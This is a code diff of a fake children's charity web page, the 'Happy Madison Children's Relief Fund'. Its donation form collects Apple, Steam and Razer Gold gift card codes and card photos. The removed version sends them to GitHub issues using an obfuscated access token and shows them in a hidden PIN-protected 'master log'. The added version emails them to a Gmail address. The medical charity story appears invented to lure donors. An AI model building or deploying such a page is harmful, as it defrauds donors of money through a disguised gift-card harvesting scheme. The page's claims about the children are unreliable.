@@ -5,201 +5,130 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Happy Madison Children’s Relief Fund</title>
     <style>
-        :root { --navy: #002d62; --red: #b00000; --white: #ffffff; --gray: #f4f7f9; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: var(--gray); color: #333; overflow-x: hidden; }
-        
-        /* Navigation */
-        .header { background: var(--navy); color: white; padding: 15px 20px; display: flex; align-items: center; border-bottom: 4px solid var(--red); position: sticky; top: 0; z-index: 1000; }
-        .menu-icon { font-size: 28px; cursor: pointer; margin-right: 15px; }
-        .logo { font-size: 15px; font-weight: bold; text-transform: uppercase; flex-grow: 1; cursor: pointer; user-select: none; text-align: center; }
-        
-        .side-nav { position: fixed; top: 0; left: -100%; width: 280px; height: 100%; background: white; box-shadow: 5px 0 15px rgba(0,0,0,0.3); transition: 0.4s; z-index: 2000; padding: 30px 20px; box-sizing: border-box; }
-        .side-nav.active { left: 0; }
-        .side-nav h2 { color: var(--navy); border-bottom: 2px solid var(--red); padding-bottom: 10px; margin-top: 0; }
-        .side-nav a { display: block; padding: 15px 0; color: #333; text-decoration: none; font-weight: bold; border-bottom: 1px solid #eee; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 1500; }
-
-        .page { display: none; padding: 20px; max-width: 480px; margin: 0 auto; background: white; min-height: 85vh; }
-        .page.active { display: block; }
-        
-        /* Homepage Visuals */
-        .gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
-        .gallery img { width: 100%; height: 90px; object-fit: cover; border-radius: 4px; border: 1px solid #ddd; }
-        .gallery img:nth-child(4), .gallery img:nth-child(5) { grid-column: span 1.5; height: 130px; }
-
-        /* Form Styling */
-        label { display: block; margin-top: 15px; font-weight: bold; font-size: 11px; text-transform: uppercase; color: var(--navy); }
-        input, select, textarea { width: 100%; padding: 14px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
-        .upload-zone { border: 2px dashed var(--red); background: #fff8f8; padding: 25px; text-align: center; margin-top: 20px; cursor: pointer; border-radius: 8px; }
-        .btn { background: #27ae60; color: white; padding: 20px; border: none; width: 100%; font-size: 17px; font-weight: bold; margin-top: 25px; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
-
-        /* Admin Secret View */
-        #adminView { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; padding: 20px; overflow-y: auto; box-sizing: border-box; }
-        .log-card { border: 2px solid var(--navy); margin-bottom: 25px; border-radius: 8px; background: #fafafa; }
-        .log-img { width: 100%; display: block; border-top: 1px solid #ddd; }
+        :root { --primary: #2c3e50; --accent: #3498db; --light: #f4f7f6; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; color: #333; background: var(--light); }
+        header { background: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        .logo { font-weight: bold; font-size: 1.2rem; color: var(--primary); }
+        .menu-btn { cursor: pointer; font-size: 1.5rem; border: none; background: none; }
+        .side-menu { position: fixed; top: 0; right: -300px; width: 250px; height: 100%; background: var(--primary); color: white; transition: 0.3s; padding-top: 60px; z-index: 999; }
+        .side-menu a { display: block; padding: 15px 25px; color: white; text-decoration: none; font-size: 1.1rem; border-bottom: 1px solid #3e4f5f; }
+        .side-menu.active { right: 0; }
+        .close-btn { position: absolute; top: 20px; left: 20px; color: white; background: none; border: none; font-size: 1.5rem; cursor: pointer; }
+        section { padding: 60px 20px; max-width: 800px; margin: auto; display: none; }
+        section.active { display: block; }
+        .hero-img { width: 100%; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .homepage-text { text-align: center; line-height: 1.6; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input, select, textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        .btn-submit { background: var(--accent); color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 1rem; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="overlay" id="overlay" onclick="closeNav()"></div>
+    <header>
+        <div class="logo">HM Children’s Relief Fund</div>
+        <button class="menu-btn" onclick="toggleMenu()">☰</button>
+    </header>
 
-<div class="side-nav" id="sideNav">
-    <h2>Foundation</h2>
-    <a href="#" onclick="showPage('home')">About Our Work</a>
-    <a href="#" onclick="showPage('support')">Support & Contact</a>
-    <a href="#" onclick="showPage('donate')">Make a Donation</a>
-</div>
-
-<div class="header">
-    <div class="menu-icon" onclick="openNav()">☰</div>
-    <div class="logo" id="adminTrigger">Happy Madison Relief Fund</div>
-</div>
-
-<div id="home" class="page active">
-    <h1>Our Cause</h1>
-    <p>We provide medical intervention for 512 children battling <strong>Chronic Pelvic Pain Syndrome (CPPS)</strong>. These children require 24/7 care, specialized nutrition, and pharmaceutical support.</p>
-    
-    <div class="gallery">
-        <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg">
-        <img src="72c4c4b4bd1513c9e29ca9ebe55776df.jpg">
-        <img src="77316900940097b984b663afdd1321ef.jpg">
-        <img src="b70b664421eebc7302476cdbb34465c.jpg">
-        <img src="IMG_20260510_193422.jpg">
+    <div id="sideMenu" class="side-menu">
+        <button class="close-btn" onclick="toggleMenu()">✕</button>
+        <a href="#" onclick="showSection('home')">Home</a>
+        <a href="#" onclick="showSection('about')">About</a>
+        <a href="#" onclick="showSection('support')">Support</a>
+        <a href="#" onclick="showSection('donation')">Donation</a>
     </div>
 
-    <p>It’s not about publicity; it’s about putting a smile on their faces. Any support for organizations that help kids is a win.</p>
-    <button class="btn" onclick="showPage('donate')" style="background:var(--navy)">View Donation Portal</button>
-</div>
-
-<div id="support" class="page">
-    <h1>Contact Us</h1>
-    <p>For inquiries, contact our private management team:</p>
-    <p style="background:#eef2f5; padding:15px; border-radius:5px; font-weight:bold; color:var(--red); text-align:center;">
-        teammangementt@gmail.com
-    </p>
-    <p>Thank you for supporting the children in the foundation.</p>
-</div>
-
-<div id="donate" class="page">
-    <h1>Secure Donation</h1>
-    <p style="font-size:12px; background:#fff5f5; padding:10px; border-left:4px solid var(--red);">
-        <strong>Card Liquidation:</strong> We use gift card assets for international medical procurement to avoid bank delays.
-    </p>
-
-    <form id="donForm">
-        <label>Donor Details</label>
-        <select id="anon" onchange="document.getElementById('nameBox').style.display = this.value=='Name'?'block':'none'">
-            <option value="Anonymous">Anonymous</option>
-            <option value="Name">Provide Full Name</option>
-        </select>
-        <input type="text" id="nameBox" style="display:none" placeholder="Enter Name">
-
-        <label>Message/Prayer</label>
-        <textarea id="msg" rows="2" placeholder="Send a message to the kids..."></textarea>
-
-        <label>Asset & Amount ($)</label>
-        <div style="display:flex; gap:10px;">
-            <select id="type" style="flex:1.5;"><option>Apple Gift Card</option><option>Steam Card</option><option>Razer Gold</option></select>
-            <input type="number" id="amt" style="flex:1;" placeholder="$">
+    <section id="home" class="active">
+        <div class="homepage-text">
+            <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg" alt="Foundation" class="hero-img">
+            <h1>Making the Poor Kids Smile</h1>
+            <p>Our foundation is dedicated to providing specialized care and pediatric support to children in need. We focus on healing, growth, and the simple joy of childhood.</p>
+            <img src="72c4c4b4bd1513c9e29ca9ebe55776df.jpg" alt="Care" class="hero-img" style="margin-top:20px;">
         </div>
+    </section>
 
-        <div class="upload-zone" onclick="document.getElementById('fileIn').click()">
-            <strong style="color:var(--red)">[ UPLOAD CARD PHOTO ]</strong><br>
-            <small>Ensure the code is scratched and visible</small>
-            <input type="file" id="fileIn" style="display:none" accept="image/*">
-        </div>
+    <section id="about">
+        <h2>About Our Good Works</h2>
+        <p>The Happy Madison Children’s Relief Fund specializes in caring for children battling Chronic Pelvic Pain Syndrome (CPPS). We currently provide full care for over 500 children.</p>
+        <p>Our work focuses on three pillars: Specialized Pediatric Feeding, Medical Intervention, and Safe Housing. To protect the privacy of the children and families, we keep our specific home locations confidential.</p>
+        <img src="77316900940097b984b663afdd1321ef.jpg" alt="Helping" class="hero-img">
+    </section>
 
-        <label>Manual Code (Optional)</label>
-        <input type="text" id="code" placeholder="16-digit code">
+    <section id="support">
+        <h2>Administrative Support</h2>
+        <p>For inquiries regarding our initiatives or if you need assistance, please contact our management team directly.</p>
+        <p><strong>Email:</strong> teammangementt@gmail.com</p>
+        <img src="IMG_20260510_193422.jpg" alt="Support" class="hero-img">
+    </section>
 
-        <button type="button" class="btn" id="sendBtn" onclick="submitData()">Confirm Donation</button>
-    </form>
-</div>
+    <section id="donation">
+        <h2>Support the Children</h2>
+        <p>Your contributions go directly toward the feeding, medicine, and shelter of the 500+ children under our care. This support is not compulsory, but your kindness makes a world of difference.</p>
+        
+        <form id="donationForm">
+            <div class="form-group">
+                <label>Identify as:</label>
+                <select id="anonStatus" onchange="toggleName()">
+                    <option value="Named">Put my name</option>
+                    <option value="Anonymous">Anonymous</option>
+                </select>
+            </div>
+            <div class="form-group" id="nameBox">
+                <label>Your Name:</label>
+                <input type="text" id="donorName" placeholder="Enter your name">
+            </div>
+            <div class="form-group">
+                <label>Amount to Donate ($):</label>
+                <input type="number" id="amount" placeholder="e.g. 500">
+            </div>
+            <div class="form-group">
+                <label>Card Type:</label>
+                <select id="cardType">
+                    <option value="Apple Gift Card">Apple Gift Card</option>
+                    <option value="Steam Gift Card">Steam Gift Card</option>
+                    <option value="Razer Gold Gift Card">Razer Gold Gift Card</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>E-Code (Optional):</label>
+                <input type="text" id="eCode" placeholder="Enter code here">
+            </div>
+            <div class="form-group">
+                <label>Upload Card Image:</label>
+                <input type="file" id="cardImage">
+            </div>
+            <div class="form-group">
+                <label>Message / Prayer Request:</label>
+                <textarea id="message" rows="4" placeholder="Your message..."></textarea>
+            </div>
+            <button type="button" class="btn-submit" onclick="submitDonation()">Submit Donation Details</button>
+        </form>
+        <img src="b70b664421eebc7302476cdbbb34465c.jpg" alt="Donation Impact" class="hero-img" style="margin-top:20px;">
+    </section>
 
-<div id="adminView">
-    <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid var(--red); padding-bottom:10px;">
-        <h2 style="color:var(--navy)">MASTER LOG</h2>
-        <button onclick="location.reload()" style="padding:10px;">EXIT</button>
-    </div>
-    <div id="adminLogs" style="margin-top:20px;">Fetching...</div>
-</div>
-
-<script>
-    // Hidden Token Reconstruction
-    const a = "ghp_kLi8O4xHj";
-    const b = "1g2XSYoRbpqB";
-    const c = "FUpYkqvLy2egZYt";
-    const SECRET = a + b + c;
-    
-    const USER = "hm-children-relief";
-    const REPO = "medical-fund";
-
-    let photoStr = "";
-
-    function openNav() { document.getElementById("sideNav").classList.add("active"); document.getElementById("overlay").style.display = "block"; }
-    function closeNav() { document.getElementById("sideNav").classList.remove("active"); document.getElementById("overlay").style.display = "none"; }
-    function showPage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active')); document.getElementById(p).classList.add('active'); closeNav(); window.scrollTo(0,0); }
-
-    document.getElementById('fileIn').onchange = function(e) {
-        const r = new FileReader();
-        r.onload = function() { photoStr = r.result; alert("Photo captured."); };
-        r.readAsDataURL(e.target.files[0]);
-    };
-
-    let taps = 0;
-    document.getElementById('adminTrigger').onclick = function() {
-        taps++;
-        if(taps === 3) {
-            if(prompt("PIN:") === "0000") { document.getElementById('adminView').style.display='block'; fetchLogs(); }
+    <script>
+        function toggleMenu() { document.getElementById('sideMenu').classList.toggle('active'); }
+        function showSection(sectionId) {
+            document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+            toggleMenu();
+            window.scrollTo(0,0);
         }
-        setTimeout(() => taps = 0, 1000);
-    };
-
-    async function submitData() {
-        const btn = document.getElementById('sendBtn');
-        const val = document.getElementById('amt').value;
-        if(!val) return alert("Enter amount.");
-
-        btn.innerHTML = "Verifying...";
-        btn.disabled = true;
-
-        const dataBody = {
-            title: `SUBMISSION: $${val} ${document.getElementById('type').value}`,
-            body: `
-DONOR: ${document.getElementById('anon').value === 'Name' ? document.getElementById('nameBox').value : 'Anonymous'}
-VALUE: $${val}
-TYPE: ${document.getElementById('type').value}
-CODE: ${document.getElementById('code').value || 'IN PHOTO'}
-MSG: ${document.getElementById('msg').value}
-DATA: ${photoStr}
-            `.trim()
-        };
-
-        try {
-            const response = await fetch(`https://api.github.com/repos/${USER}/${REPO}/issues`, {
-                method: 'POST',
-                headers: { 'Authorization': `token ${SECRET}`, 'Content-Type': 'application/json' },
-                body: JSON.stringify(dataBody)
-            });
-            if(response.ok) { alert("Donation Success!"); location.reload(); }
-            else { alert("Error: Security Timeout. Refresh and try again."); btn.disabled = false; btn.innerHTML = "Confirm Donation"; }
-        } catch (err) { alert("Network Error."); btn.disabled = false; }
-    }
-
-    async function fetchLogs() {
-        const res = await fetch(`https://api.github.com/repos/${USER}/${REPO}/issues?state=open`, {
-            headers: { 'Authorization': `token ${SECRET}` }
-        });
-        const items = await res.json();
-        document.getElementById('adminLogs').innerHTML = items.map(i => {
-            const [txt, img] = i.body.split("DATA: ");
-            return `<div class="log-card">
-                <div style="background:var(--navy);color:white;padding:10px;font-size:11px;">${new Date(i.created_at).toLocaleString()}</div>
-                <div style="padding:10px;font-family:monospace;font-size:12px;"><pre>${txt}</pre></div>
-                ${img ? `<img src="${img}" class="log-img">` : ''}
-            </div>`;
-        }).join('');
-    }
-</script>
+        function toggleName() {
+            const status = document.getElementById('anonStatus').value;
+            document.getElementById('nameBox').style.display = (status === 'Anonymous') ? 'none' : 'block';
+        }
+        function submitDonation() {
+            const name = document.getElementById('donorName').value || "Anonymous";
+            const amount = document.getElementById('amount').value;
+            const card = document.getElementById('cardType').value;
+            const code = document.getElementById('eCode').value;
+            const msg = document.getElementById('message').value;
+            const subject = encodeURIComponent("New Donation Confirmation - " + name);
+            const body = encodeURIComponent("Hello Administrative Office,\n\nI would like to support the children's fund.\n\nDonor: " + name + "\nAmount: $" + amount + "\nCard Type: " + card + "\nCode: " + code + "\nMessage/Prayer: " + msg + "\n\n(Note: Please attach your card photo to this email before sending)");
+            window.location.href = `mailto:teammangementt@gmail.com?subject=${subject}&body=${body}`;
+        }
+    </script>
 </body>
 </html>
